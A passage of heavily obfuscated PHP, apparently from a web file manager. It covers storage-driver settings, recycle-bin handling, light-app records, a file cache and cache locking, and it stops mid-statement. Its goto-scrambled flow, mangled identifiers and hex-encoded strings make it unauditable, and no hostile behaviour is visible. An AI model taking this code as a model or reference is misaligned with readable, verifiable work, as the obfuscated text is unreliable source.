$eÃùö¤ËÂŸ->folderSizeReset($Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[465]]); goto bÈÅÙ¦óÄ™; BÃõŸÜ¼´õ: } $eÃùö¤ËÂŸ->updateModifyTime($Eã´»¨Š‘ç); goto dª›¢Áö¬¤; aª÷‰¬¹‡: $eªïÚ‚¨íÆ =& $_SERVER[Ä¿Ş°¨]; $eÃùö¤ËÂŸ = Model($eªïÚ‚¨íÆ[1095]); $BÁ³†À¤Õ„ = $this->listData(); goto C§‰‘Ö×Œ; dª›¢Áö¬¤: } private function restoreFolderChildren($Bíà„©†ïÒ, $bä´Íöã¾Õ) { goto C¶ ¼Ü„„©; C¶ ¼Ü„„©: $f«éöÔ¤ª‘ =& $_SERVER[Ä¿Ş°¨]; $bù¾ğ¾à¢ = Model($f«éöÔ¤ª‘[1095]); $Bµ³œ´¥ø‡ = array($f«éöÔ¤ª‘[374] => array($f«éöÔ¤ª‘[7], array())); goto a§¶Ê¤±™É; a§¶Ê¤±™É: foreach ($bä´Íöã¾Õ as $fƒ½ì¬ŒÒØ) { if ($fƒ½ì¬ŒÒØ == $Bíà„©†ïÒ) { continue; } if (!$bù¾ğ¾à¢->isParentOf($Bíà„©†ïÒ, $fƒ½ì¬ŒÒØ)) { continue; } $C ö“ˆ…›ë = $bù¾ğ¾à¢->sourceInfo($fƒ½ì¬ŒÒØ); if ($C ö“ˆ…›ë[$f«éöÔ¤ª‘[375]] == $f«éöÔ¤ª‘[83]) { $Bµ³œ´¥ø‡[] = array($f«éöÔ¤ª‘[529] => array($f«éöÔ¤ª‘[487], $C ö“ˆ…›ë[$f«éöÔ¤ª‘[463]] . $fƒ½ì¬ŒÒØ . $f«éöÔ¤ª‘[488])); } else { $Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[374]][1][] = $fƒ½ì¬ŒÒØ; } } if (!$Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[374]][1]) { unset($Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[374]]); } if (!$Bµ³œ´¥ø‡) { return; } goto e´ƒ×¤ˆœÖ; e´ƒ×¤ˆœÖ: $Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[374]][1] = array_unique($Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[374]][1]); $Bµ³œ´¥ø‡[$f«éöÔ¤ª‘[901]] = $f«éöÔ¤ª‘[2143]; $bù¾ğ¾à¢->where($Bµ³œ´¥ø‡)->setField($f«éöÔ¤ª‘[401], 1); goto añ®ÙÕ×³²; añ®ÙÕ×³²: } private function recycleMove($C‰õ¹ºŸ, $b»æÌºî” = 1) { $cÑÏ‹«Š“ =& $_SERVER[Ä¿Ş°¨]; $d îí¤®¶ = Model($cÑÏ‹«Š“[1095]); $Dù¨”ò¨¯ = Model($cÑÏ‹«Š“[2312]); $AÚƒö“­ä = array($cÑÏ‹«Š“[374] => $C‰õ¹ºŸ); if ($b»æÌºî”) { $d îí¤®¶->where($AÚƒö“­ä)->setField($cÑÏ‹«Š“[401], 1); $Dù¨”ò¨¯->eventRecycle($C‰õ¹ºŸ, $cÑÏ‹«Š“[2313]); } else { $D¥„Ìñ•ˆ = $d îí¤®¶->where($AÚƒö“­ä)->find(); $AÌùŒ±ƒÙ = $D¥„Ìñ•ˆ[$cÑÏ‹«Š“[375]] == $cÑÏ‹«Š“[83]; $cÊé’Ãê—— = $d îí¤®¶->fileNameAuto($D¥„Ìñ•ˆ[$cÑÏ‹«Š“[465]], $D¥„Ìñ•ˆ[$cÑÏ‹«Š“[28]], REPEAT_RENAME_FOLDER, $AÌùŒ±ƒÙ); if ($cÊé’Ãê—— != $D¥„Ìñ•ˆ[$cÑÏ‹«Š“[28]]) { $d îí¤®¶->rename($C‰õ¹ºŸ, $cÊé’Ãê——); } $d îí¤®¶->where($AÚƒö“­ä)->setField($cÑÏ‹«Š“[401], 0); $Dù¨”ò¨¯->eventRecycle($C‰õ¹ºŸ, $cÑÏ‹«Š“[2314]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x73\x74\x6f\162\141\147\145\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x69\172\145\115\x61\x78", "\163\x79\163\x74\x65\155", "\x64\145\146\141\165\154\164", "\x64\x72\x69\x76\145\x72", "\143\157\156\146\151\147"); public function listData($bŸÛÄÉñ¦£ = false, $bÊÍğÊà®Ü = "\x6d\x6f\x64\151\x66\171\x54\x69\155\145", $DÌğƒîéˆ = false) { goto AîË¯¢š«; A ‰ÌĞáÍñ: return $eôß—Ù¢›; goto FÄØá“‹Â; AîË¯¢š«: $c×Ÿ–ŒöºÌ =& $_SERVER[Ä¿Ş°¨]; $eôß—Ù¢› = parent::listData($bŸÛÄÉñ¦£, $bÊÍğÊà®Ü, $DÌğƒîéˆ); if ($bŸÛÄÉñ¦£) { return $eôß—Ù¢›; } goto Dô¦Æ‚×“›; Dô¦Æ‚×“›: foreach ($eôß—Ù¢› as $f÷í±ˆÑš => $DÜîÔá·) { unset($eôß—Ù¢›[$f÷í±ˆÑš][$c×Ÿ–ŒöºÌ[6]]); $eôß—Ù¢›[$f÷í±ˆÑš][$c×Ÿ–ŒöºÌ[2049]] = 0; } $c°àŸéÀ = array_to_keyvalue($eôß—Ù¢›, $c×Ÿ–ŒöºÌ[33], $c×Ÿ–ŒöºÌ[372]); $this->_listAppendSize($eôß—Ù¢›, $c°àŸéÀ); goto A ‰ÌĞáÍñ; FÄØá“‹Â: } public function _listAppendSize(&$eËÈ½·´Åë, $eÏ–³¾ÀÕ­) { $fÙ‘áÚ” =& $_SERVER[Ä¿Ş°¨]; $eïï‘»¬õ = $fÙ‘áÚ”[2315] . implode($fÙ‘áÚ”[47], $eÏ–³¾ÀÕ­) . $fÙ‘áÚ”[2316]; $cĞ•Š¦Ç¼ = Model($fÙ‘áÚ”[713])->query($eïï‘»¬õ); $cĞ•Š¦Ç¼ = array_to_keyvalue($cĞ•Š¦Ç¼, $fÙ‘áÚ”[372], $fÙ‘áÚ”[77]); foreach ($eËÈ½·´Åë as $f¹£ğğìøÆ => $C…ùÈª¢Ó„) { $eËÈ½·´Åë[$f¹£ğğìøÆ][$fÙ‘áÚ”[2049]] = isset($cĞ•Š¦Ç¼[$C…ùÈª¢Ó„[$fÙ‘áÚ”[372]]]) ? $cĞ•Š¦Ç¼[$C…ùÈª¢Ó„[$fÙ‘áÚ”[372]]] : 0; } } public function getConfig($d‹›“î¬Ôˆ) { $EÔ‹¯ƒ˜´¾ = parent::listData($d‹›“î¬Ôˆ); return json_decode($EÔ‹¯ƒ˜´¾[$_SERVER[Ä¿Ş°¨][6]], !0); } public function update($F²±™¢Ûñˆ, $CÑÎŞÆÄáÈ) { goto F™÷Õ³­Úì; F™÷Õ³­Úì: $C…ÔêŒÃÓÇ =& $_SERVER[Ä¿Ş°¨]; $c©Ö¥òğÙá = $CÑÎŞÆÄáÈ[$C…ÔêŒÃÓÇ[28]]; $bÄÉ‰íª¨ˆ = array_to_keyvalue(parent::listData(), $C…ÔêŒÃÓÇ[28]); goto F•†ÏíÌÑ; DœõÂìù­: $AœÛˆ¹Ê¹Å = parent::update($F²±™¢Ûñˆ, $CÑÎŞÆÄáÈ); if ($AœÛˆ¹Ê¹Å && $CÑÎŞÆÄáÈ[$C…ÔêŒÃÓÇ[34]]) { foreach ($bÄÉ‰íª¨ˆ as $Föí·äŒ´Õ) { if ($Föí·äŒ´Õ[$C…ÔêŒÃÓÇ[34]] && $Föí·äŒ´Õ[$C…ÔêŒÃÓÇ[372]] != $F²±™¢Ûñˆ) { parent::update($Föí·äŒ´Õ[$C…ÔêŒÃÓÇ[372]], array($C…ÔêŒÃÓÇ[34] => 0)); } } } return $AœÛˆ¹Ê¹Å; goto e™ß£æÕ¾ñ; F•†ÏíÌÑ: if (isset($bÄÉ‰íª¨ˆ[$c©Ö¥òğÙá]) && $bÄÉ‰íª¨ˆ[$c©Ö¥òğÙá][$C…ÔêŒÃÓÇ[372]] != $F²±™¢Ûñˆ) { return !1; } if (isset($CÑÎŞÆÄáÈ[$C…ÔêŒÃÓÇ[2317]]) && $CÑÎŞÆÄáÈ[$C…ÔêŒÃÓÇ[2317]] == $C…ÔêŒÃÓÇ[83]) { $this->checkConfig($CÑÎŞÆÄáÈ); } unset($CÑÎŞÆÄáÈ[$C…ÔêŒÃÓÇ[2317]]); goto DœõÂìù­; e™ß£æÕ¾ñ: } public function add($A Ô‘À¶ôğ) { goto EíÊÎÚ°ÆÑ; b³Ü²ŠÀ‘: return $B«†ÛÁ…íÛ; goto C¹³êâˆ–; EíÊÎÚ°ÆÑ: $AšÈìùöøé =& $_SERVER[Ä¿Ş°¨]; $Fâˆ‰ÅÉĞ = array_to_keyvalue(parent::listData(), $AšÈìùöøé[28]); if (isset($Fâˆ‰ÅÉĞ[$A Ô‘À¶ôğ[$AšÈìùöøé[28]]])) { return !1; } goto eèß¯é…æ‘; eèß¯é…æ‘: $this->checkConfig($A Ô‘À¶ôğ); $B«†ÛÁ…íÛ = parent::insert($A Ô‘À¶ôğ); if ($B«†ÛÁ…íÛ && $A Ô‘À¶ôğ[$AšÈìùöøé[34]]) { foreach ($Fâˆ‰ÅÉĞ as $eÖŠ¬Œ™°Ò) { if ($eÖŠ¬Œ™°Ò[$AšÈìùöøé[34]]) { parent::update($eÖŠ¬Œ™°Ò[$AšÈìùöøé[372]], array($AšÈìùöøé[34] => 0)); } } } goto b³Ü²ŠÀ‘; C¹³êâˆ–: } public function checkConfig(&$fèƒ¨ŠÒË) { goto fŞ„´µ‹³; dÖ‚±ìÒì: foreach ($c¾¾åÌ—œ as $D‚˜ªÓ¢ì => $Aƒï˜‘ö¼Ü) { $c¾¾åÌ—œ[$D‚˜ªÓ¢ì] = trim($Aƒï˜‘ö¼Ü); } $BòĞ çôÜ = rtrim($c¾¾åÌ—œ[$a—ŸéÛ§Ë [1009]], $a—ŸéÛ§Ë [8]) . $a—ŸéÛ§Ë [8]; $F¾¦ĞáÛ¯¤ = $this->driverType($Eº„•ĞÒ–„); goto CîßŠ ¥†™; e“…™å˜ñİ: $C„Ê¤Ï•¿× = $C†œ×Éøµë->getPath($BòĞ çôÜ . $a—ŸéÛ§Ë [1945]); if (!$C†œ×Éøµë->mkfile($C„Ê¤Ï•¿×)) { show_json(LNG($a—ŸéÛ§Ë [2318]), !1); } $c¾¾åÌ—œ[$a—ŸéÛ§Ë [1009]] = $BòĞ çôÜ; goto aÏÖĞ½­Ù…; fŞ„´µ‹³: $a—ŸéÛ§Ë  =& $_SERVER[Ä¿Ş°¨]; $Eº„•ĞÒ–„ = strtolower($fèƒ¨ŠÒË[$a—ŸéÛ§Ë [90]]); $c¾¾åÌ—œ = json_decode($fèƒ¨ŠÒË[$a—ŸéÛ§Ë [6]], !0); goto dÖ‚±ìÒì; aÏÖĞ½­Ù…: $fèƒ¨ŠÒË[$a—ŸéÛ§Ë [6]] = json_encode($c¾¾åÌ—œ); $fèƒ¨ŠÒË[$a—ŸéÛ§Ë [90]] = $F¾¦ĞáÛ¯¤; return !0; goto Cö’äøªÈË; CîßŠ ¥†™: $b´—µ³½ç = $a—ŸéÛ§Ë [71] . $F¾¦ĞáÛ¯¤; $C†œ×Éøµë = new $b´—µ³½ç($c¾¾åÌ—œ); if (in_array($Eº„•ĞÒ–„, $C†œ×Éøµë->objectDriver)) { if (!$C†œ×Éøµë->isBucketCors() && !$C†œ×Éøµë->setBucketCors()) { $a±Ğ‘©È§ = LNG($a—ŸéÛ§Ë [2318]); $a±Ğ‘©È§ .= $a—ŸéÛ§Ë [2319] . LNG($a—ŸéÛ§Ë [2320]); show_json($a±Ğ‘©È§, !1); } } goto e“…™å˜ñİ; Cö’äøªÈË: } private function driverType($dğùàäîƒÙ) { $C÷è¤¼ô« =& $_SERVER[Ä¿Ş°¨]; $F‹ †ë‚Ëï = array($C÷è¤¼ô«[101] => $C÷è¤¼ô«[2321], $C÷è¤¼ô«[58] => $C÷è¤¼ô«[2322], $C÷è¤¼ô«[64] => $C÷è¤¼ô«[2323]); if (isset($F‹ †ë‚Ëï[$dğùàäîƒÙ])) { return $F‹ †ë‚Ëï[$dğùàäîƒÙ]; } return strtoupper($dğùàäîƒÙ); } public function driverListSystem() { $FŠŞËğÆù =& $_SERVER[Ä¿Ş°¨]; $EÍ—ÇõÌĞæ = parent::listData(); $bó™Ó¤ïŸ = array(); foreach ($EÍ—ÇõÌĞæ as $bí®ìÌ…÷) { unset($bí®ìÌ…÷[$FŠŞËğÆù[183]], $bí®ìÌ…÷[$FŠŞËğÆù[106]]); $bí®ìÌ…÷[$FŠŞËğÆù[6]] = json_decode($bí®ìÌ…÷[$FŠŞËğÆù[6]], !0); $bó™Ó¤ïŸ[] = $bí®ìÌ…÷; } return $bó™Ó¤ïŸ; } public function defaultDriver() { $Cªæí«ßˆ =& $_SERVER[Ä¿Ş°¨]; $D•´ö†ŒÖ = parent::listData(); $F›ŸàÏƒğ = array_filter_by_field($D•´ö†ŒÖ, $Cªæí«ßˆ[34], 1); $F›ŸàÏƒğ = $F›ŸàÏƒğ[0]; if ($F›ŸàÏƒğ) { $F›ŸàÏƒğ[$Cªæí«ßˆ[6]] = json_decode($F›ŸàÏƒğ[$Cªæí«ßˆ[6]], !0); } return $F›ŸàÏƒğ; } public function driverInfo($EíÓïïÈµø) { $C¿Ü±Ù =& $_SERVER[Ä¿Ş°¨]; $FíŒçÖ£é = array_to_keyvalue(parent::listData(), $C¿Ü±Ù[372]); if (!isset($FíŒçÖ£é[$EíÓïïÈµø])) { return !1; } $f±ˆØó¡· = $FíŒçÖ£é[$EíÓïïÈµø]; $f±ˆØó¡·[$C¿Ü±Ù[6]] = json_decode($f±ˆØó¡·[$C¿Ü±Ù[6]], !0); return $f±ˆØó¡·; } public function remove($dàò»õ›) { $this->removeShareItems($dàò»õ›); return parent::remove($dàò»õ›); } public function removeWithFile($A”ÁáæáÂ) { goto d×“Å­øˆ; EàØŠ…×ÇÛ: $F¦æÄ“×Â = Model($aÚ›ô†‘‘ê[163])->where($cËŒ¿Æ¥¢¸)->field($aÚ›ô†‘‘ê[2327])->select(); foreach ($F¦æÄ“×Â as $fƒìÑˆ—º) { goto FŒƒ‹áÍ; FŒƒ‹áÍ: $DÊ„Ì„‰‰ó = $fƒìÑˆ—º[$aÚ›ô†‘‘ê[75]]; $B’ÉàÉ…­¬ = $a´Ö™½Šìå . str_replace("\173\x69\157\x3a{$A”ÁáæáÂ}\175\x2f", $aÚ›ô†‘‘ê[33], $DÊ„Ì„‰‰ó); if (!IO::exist($DÊ„Ì„‰‰ó)) { $EÒÕåÎçÓˆ[] = $fƒìÑˆ—º[$aÚ›ô†‘‘ê[423]]; $f©´ííù©‰->updateFileEnd($fƒìÑˆ—º[$aÚ›ô†‘‘ê[28]], $fƒìÑˆ—º[$aÚ›ô†‘‘ê[77]]); continue; } goto Fâ©ŞÏ†’Ï; D…ÑÃÊù§‹: $D¥Ï¶µëœÊ = array($aÚ›ô†‘‘ê[737] => $DÃ„éÙ, $aÚ›ô†‘‘ê[75] => $B’ÉàÉ…­¬); Model($aÚ›ô†‘‘ê[163])->where($cËŒ¿Æ¥¢¸)->save($D¥Ï¶µëœÊ); goto d¸ÓŒ´½Õç; Fâ©ŞÏ†’Ï: if (IO::exist($B’ÉàÉ…­¬)) { $f©´ííù©‰->updateFileEnd($fƒìÑˆ—º[$aÚ›ô†‘‘ê[28]], $fƒìÑˆ—º[$aÚ›ô†‘‘ê[77]]); continue; } if (!IO::move($DÊ„Ì„‰‰ó, get_path_father($B’ÉàÉ…­¬))) { $BÃ‰¸•†Å› = !1; break; } $cËŒ¿Æ¥¢¸ = array($aÚ›ô†‘‘ê[423] => $fƒìÑˆ—º[$aÚ›ô†‘‘ê[423]]); goto D…ÑÃÊù§‹; d¸ÓŒ´½Õç: } $this->removeByFileID($EÒÕåÎçÓˆ); goto b‹“ÑâÀò¬; dÅœ‚ÂªÅ¾: $a´Ö™½Šìå = "\173\151\157\x3a{$DÃ„éÙ}\x7d\57"; $BÃ‰¸•†Å› = !0; $EÒÕåÎçÓˆ = array(); goto EàØŠ…×ÇÛ; Dø¶ô÷Ğ¡æ: $A„¶¼ƒÓ‘Õ = Model($aÚ›ô†‘‘ê[426])->where($cËŒ¿Æ¥¢¸)->sum($aÚ›ô†‘‘ê[77]); $fù¢ÁÅê£é = $aÚ›ô†‘‘ê[2324] . $A”ÁáæáÂ; $f©´ííù©‰ = new TaskFileTransfer($fù¢ÁÅê£é, $aÚ›ô†‘‘ê[2325], $FÁ ¤ÄÂÙì, LNG($aÚ›ô†‘‘ê[2326]) . "\50{$A”ÁáæáÂ}\x29"); goto eâò”§¤Œñ; b‹“ÑâÀò¬: if (!$BÃ‰¸•†Å›) { $f©´ííù©‰->stop($fù¢ÁÅê£é); return !1; } $f©´ííù©‰->end(); $this->remove($A”ÁáæáÂ); goto a‹‚•‹ìÇ©; eâò”§¤Œñ: $f©´ííù©‰->task[$aÚ›ô†‘‘ê[692]] = (double) $A„¶¼ƒÓ‘Õ; $F‘»Ôˆ†à´ = KodIO::defaultDriver(); $DÃ„éÙ = $F‘»Ôˆ†à´[$aÚ›ô†‘‘ê[372]]; goto dÅœ‚ÂªÅ¾; d×“Å­øˆ: $aÚ›ô†‘‘ê =& $_SERVER[Ä¿Ş°¨]; $cËŒ¿Æ¥¢¸ = array($aÚ›ô†‘‘ê[737] => $A”ÁáæáÂ); $FÁ ¤ÄÂÙì = Model($aÚ›ô†‘‘ê[426])->where($cËŒ¿Æ¥¢¸)->count(); goto Dø¶ô÷Ğ¡æ; a‹‚•‹ìÇ©: } public function progress($D–ê‹º›½É) { return Task::get($_SERVER[Ä¿Ş°¨][2324] . $D–ê‹º›½É); } private function removeByFileID($cçñšÌ©’ = array()) { goto Cí…œ³ÕŠĞ; E÷ŠğèêÌ¨: foreach ($F¼ƒšÚÂ as $E•ÉÀ±Â¥Ş) { Model($A³˜–ˆ¶Ş[387])->removeNow($E•ÉÀ±Â¥Ş, !1); } goto Cª„¾Ûìîµ; a¾”±²Ûˆ: $F¼ƒšÚÂ = Model($A³˜–ˆ¶Ş[1095])->where($AóÕ®ñ—ÛÖ)->field($A³˜–ˆ¶Ş[374])->select(); if (!$F¼ƒšÚÂ) { return; } $F¼ƒšÚÂ = array_to_keyvalue($F¼ƒšÚÂ, $A³˜–ˆ¶Ş[33], $A³˜–ˆ¶Ş[374]); goto E÷ŠğèêÌ¨; Cí…œ³ÕŠĞ: $A³˜–ˆ¶Ş =& $_SERVER[Ä¿Ş°¨]; if (empty($cçñšÌ©’)) { return; } $AóÕ®ñ—ÛÖ = array($A³˜–ˆ¶Ş[423] => array($A³˜–ˆ¶Ş[7], $cçñšÌ©’)); goto a¾”±²Ûˆ; Cª„¾Ûìîµ: } private function removeShareItems($D¸˜ŒÕñÇ†) { goto Bç†®Ë§¿‡; c·ìÑØ¬„Ş: Model($a“±ÁâÙï±[540])->remove($B¹ÒöĞ¿); goto c¼ó¡Á‹É»; Aåíó³¶­‚: $CÆ„ÁÔõçá = Model($a“±ÁâÙï±[2040])->where($CÊÉ¢¶ùä)->field($a“±ÁâÙï±[445])->select(); if (empty($CÆ„ÁÔõçá)) { return; } $B¹ÒöĞ¿ = array_to_keyvalue($CÆ„ÁÔõçá, $a“±ÁâÙï±[33], $a“±ÁâÙï±[445]); goto c·ìÑØ¬„Ş; Bç†®Ë§¿‡: $a“±ÁâÙï± =& $_SERVER[Ä¿Ş°¨]; $E•àÎ×»› = "\173\x69\157\x3a{$D¸˜ŒÕñÇ†}\x7d\57"; $CÊÉ¢¶ùä = array($a“±ÁâÙï±[374] => 0, $a“±ÁâÙï±[1003] => array($a“±ÁâÙï±[745], "{$E•àÎ×»›}\x25")); goto Aåíó³¶­‚; c¼ó¡Á‹É»: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x4c\x69\x67\x68\164\x41\160\x70"; public $modelType = "\x53\x79\163\164\x65\155\117\160\x74\x69\157\156"; public $field = array("\x6e\141\x6d\145", "\x67\x72\x6f\165\160", "\144\145\163\143", "\143\x6f\x6e\164\x65\x6e\164"); public function listData($B®“†á¦ = false, $C‹†ÊƒæÍ = "\x6d\157\x64\x69\x66\171\124\x69\x6d\145", $e¼©éÃ‚›² = true) { return parent::listData($B®“†á¦, $C‹†ÊƒæÍ, $e¼©éÃ‚›²); } public function remove($Cî©ô¹‘»é) { $B¦…´âÁÄ‘ = $this->findByName($Cî©ô¹‘»é); if (!$B¦…´âÁÄ‘) { return !1; } return parent::remove($B¦…´âÁÄ‘[$_SERVER[Ä¿Ş°¨][372]]); } public function add($FÖÙÒŠ½…á) { if ($this->findByName($FÖÙÒŠ½…á[$_SERVER[Ä¿Ş°¨][28]])) { return !1; } return parent::insert($FÖÙÒŠ½…á); } public function update($CìÕ˜¨”ğÀ, $c•ªÙ³Ù) { $cç‘‰ÖØèË =& $_SERVER[Ä¿Ş°¨]; $f‡çÑ±¾ë– = $this->findByName($CìÕ˜¨”ğÀ); $CÍ¬ÏˆŞŸÍ = $this->findByName($c•ªÙ³Ù[$cç‘‰ÖØèË[28]]); if (!$f‡çÑ±¾ë– || $CÍ¬ÏˆŞŸÍ && $CÍ¬ÏˆŞŸÍ[$cç‘‰ÖØèË[372]] != $f‡çÑ±¾ë–[$cç‘‰ÖØèË[372]]) { return !1; } return parent::update($f‡çÑ±¾ë–[$cç‘‰ÖØèË[372]], $c•ªÙ³Ù); } } goto aØñ‘íùÕò; CÈ‹İî•¤: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Aë¨ò‰Òæ™, $eÀî¼±‡ô¦) { $a™õ–ÍïãŞ =& $_SERVER[Ä¿Ş°¨]; $this->cachePath = $Aë¨ò‰Òæ™[$a™õ–ÍïãŞ[75]]; $this->prefix = $a™õ–ÍïãŞ[754]; $this->cacheTime = $eÀî¼±‡ô¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bÌ›æ¥–‹) { $cƒÀËê¤„è =& $_SERVER[Ä¿Ş°¨]; $bÌ›æ¥–‹ = str_replace(array($cƒÀËê¤„è[755], $cƒÀËê¤„è[93], $cƒÀËê¤„è[69]), $cƒÀËê¤„è[756], $bÌ›æ¥–‹); return $this->cachePath . $cƒÀËê¤„è[757] . $bÌ›æ¥–‹ . $cƒÀËê¤„è[758]; } public function set($D­…­˜§ÀØ, $f¾òª•Ê¹, $DëÊ²Õ‰¿ = false) { $dŒóÜâ¾‚… = $this->getFile($D­…­˜§ÀØ); if (file_put_contents($dŒóÜâ¾‚…, $this->prefix . $f¾òª•Ê¹, LOCK_EX)) { return !0; } @unlink($dŒóÜâ¾‚…); return !1; } public function get($BÜß â¥Ê) { $AŠñÇ¥À¾ˆ = $this->getFile($BÜß â¥Ê); if (file_exists($AŠñÇ¥À¾ˆ) && filemtime($AŠñÇ¥À¾ˆ) < time() - $this->cacheTime) { @unlink($AŠñÇ¥À¾ˆ); return !1; } $a¼Çâğàô = @file_get_contents($AŠñÇ¥À¾ˆ); return substr($a¼Çâğàô, strlen($this->prefix)); } public function remove($F¤”ÎÕ‘·˜) { $CÛÙàÙË„÷ = $this->getFile($F¤”ÎÕ‘·˜); return @unlink($CÛÙàÙË„÷); } public function deleteAll() { $c‘ÀåšéƒÊ =& $_SERVER[Ä¿Ş°¨]; $cˆ†ƒšê±³ = scandir($this->cachePath); foreach ($cˆ†ƒšê±³ as $B²åÍ†ìæ) { $B¢‰Ø«”Õ¼ = $this->cachePath . $B²åÍ†ìæ; if (strpos($B¢‰Ø«”Õ¼, $c‘ÀåšéƒÊ[758]) && strpos($B¢‰Ø«”Õ¼, $c‘ÀåšéƒÊ[759])) { @unlink($B¢‰Ø«”Õ¼); } } } public function clearTimeout() { $Dğ¯”ìš½â =& $_SERVER[Ä¿Ş°¨]; $E±àõºĞÔ’ = scandir($this->cachePath); foreach ($E±àõºĞÔ’ as $F·Ò‹èÏ¯) { $aêŞ“¢ôğ = $this->cachePath . $F·Ò‹èÏ¯; if (strpos($aêŞ“¢ôğ, $Dğ¯”ìš½â[758]) && strpos($aêŞ“¢ôğ, $Dğ¯”ìš½â[759]) && filemtime($aêŞ“¢ôğ) < time() - $this->cacheTime) { @unlink($aêŞ“¢ôğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c£ä§ÚöŒ; E……Û¿»ó¬: self::$timeout = $b‡Ê×Ğƒ¢·[$A¨–Ãª¹æ[760]] ? $b‡Ê×Ğƒ¢·[$A¨–Ãª¹æ[760]] : 10; $FìÍ•ªƒ½ë = _get($GLOBALS[$A¨–Ãª¹æ[6]], $A¨–Ãª¹æ[761]); $E¥°¯«ªƒä = $b‡Ê×Ğƒ¢·[$A¨–Ãª¹æ[747]] ? $b‡Ê×Ğƒ¢·[$A¨–Ãª¹æ[747]] : $A¨–Ãª¹æ[163]; goto bØÑ‰×ÎÏõ; bØÑ‰×ÎÏõ: if ($E¥°¯«ªƒä == $A¨–Ãª¹æ[17] && $FìÍ•ªƒ½ë == $A¨–Ãª¹æ[9]) { $E¥°¯«ªƒä = $A¨–Ãª¹æ[163]; } switch ($E¥°¯«ªƒä) { case $A¨–Ãª¹æ[750]: self::$handle = new CacheLockRedis(); break; case $A¨–Ãª¹æ[751]: self::$handle = new CacheLockMemcached(); break; case $A¨–Ãª¹æ[17]: self::$handle = new CacheLockDatabase(); break; case $A¨–Ãª¹æ[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto fÂê…¥•é; c£ä§ÚöŒ: $A¨–Ãª¹æ =& $_SERVER[Ä¿Ş°¨]; if (self::$handle) { return self::$handle; } $b‡Ê×Ğƒ¢· = $GLOBALS[$A¨–Ãª¹æ[6]][$A¨–Ãª¹æ[333]]; goto E……Û¿»ó¬; fÂê…¥•é: } private static function key($C†Åóˆèªé) { return $_SERVER[Ä¿Ş°¨][762] . Cache::key($C†Åóˆèªé); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($c§§ŠÌº­ = '') { self::$errorMsg = $c§§ŠÌº­; } public static function lockGlobal($e÷Ğ¢ø­ä®, $Bì°¢óëŒ) { return self::lock($e÷Ğ¢ø­ä®, $Bì°¢óëŒ, !0); } public static function lock($A¦‘ß×£ù…, $E¥±µˆÚ‰ = false, $a¾ÊŸ¥‘“ = false) { goto c£åÑ‘Õ²ß; c£åÑ‘Õ²ß: $Aï¤˜ÆçŠ =& $_SERVER[Ä¿Ş°¨]; $DÖéñÎª£ = self::init(); $FáÙ‘¹ÄÎ = self::key($A¦‘ß×£ù…); goto DÊã›ÃÂ; DÊã›ÃÂ: $E¥±µˆÚ‰ = $E¥±µˆÚ‰ ? $E¥±µˆÚ‰ : self::$timeout; $e•‰šñôäÅ = $DÖéñÎª£->lock($FáÙ‘¹ÄÎ, $E¥±µˆÚ‰); if (!$e•‰šñôäÅ) { $CÏÅ‰õ…‚ = $Aï¤˜ÆçŠ[763] . $E¥±µˆÚ‰ . $Aï¤˜ÆçŠ[67] . self::$errorMsg . $Aï¤˜ÆçŠ[67] . get_caller_msg(); $C¯á ‡Õ³ = "\114\x6f\143\x6b\x20\141\143\164\x69\157\x6e\72\40{$FáÙ‘¹ÄÎ}\40\x74\151\x6d\145\x6f\165\164\54\x6f\166\145\x72\40{$E¥±µˆÚ‰}\x20\x73"; $C¯á ‡Õ³ = self::$errorMsg ? self::$errorMsg : $aˆ†²ì­«´; write_log($CÏÅ‰õ…‚, $Aï¤˜ÆçŠ[764]); show_json($C¯á ‡Õ³, !1); } goto F¨åÆÔÓÊó; F¨åÆÔÓÊó: if (!$a¾ÊŸ¥‘“) { self::$lockItem[$FáÙ‘¹ÄÎ] = !0; } return $e•‰šñôäÅ; goto b¡ñŒïÓ¶Ö; b¡ñŒïÓ¶Ö: } public static function lockGet($Cô®¥‹ŒŒÍ) { $aĞÍìÆÇŞ‚ = self::key($Cô®¥‹ŒŒÍ); if (self::$lockItem[$aĞÍìÆÇŞ‚]) { return self::$lockItem[$aĞÍìÆÇŞ‚]; } return self::init()->lockGet($aĞÍìÆÇŞ‚); } public static function unlock($fğòèàŒƒà) { $d§èæÜÎ¦¡ = self::key($fğòèàŒƒà); self::$lockItem[$d§èæÜÎ¦¡] = null; return self::init()->unlock($d§èæÜÎ¦¡); } public static function unlockRuntime() { $b‘§¦ôœ”Ò =& $_SERVER[Ä¿Ş°¨]; $DİõºáŸÏ = self::init(); $A»îˆÚš‘† = !1; foreach (self::$lockItem as $bçî¦„ê¢ => $bœï©§Ö…Ä) { if (!$bœï©§Ö…Ä) { continue; } $DİõºáŸÏ->unlock($bçî¦„ê¢); if (!$A»îˆÚš‘†) { $A»îˆÚš‘† = !0; write_log($b‘§¦ôœ”Ò[765] . $bçî¦„ê¢ . $b‘§¦ôœ”Ò[67] . get_caller_msg(), $b‘§¦ôœ”Ò[764]); continue; } write_log($b‘§¦ôœ”Ò[765] . $bçî¦„ê¢, $b‘§¦ôœ”Ò[764]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto aÅÀ‰ÄÔÕ; Eì§¢È®à–: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($d¥ÙÅÄ¡ä) { $d¬¸Î™½ƒç =& $_SERVER[Ä¿Ş°¨]; return array($d¬¸Î™½ƒç[2437] => array(USER_ID, $d¬¸Î™½ƒç[2438])); } protected function listData() { $e–•±”¢¹Û =& $_SERVER[Ä¿Ş°¨]; $a’ãØ”šè = array($e–•±”¢¹Û[1390] => 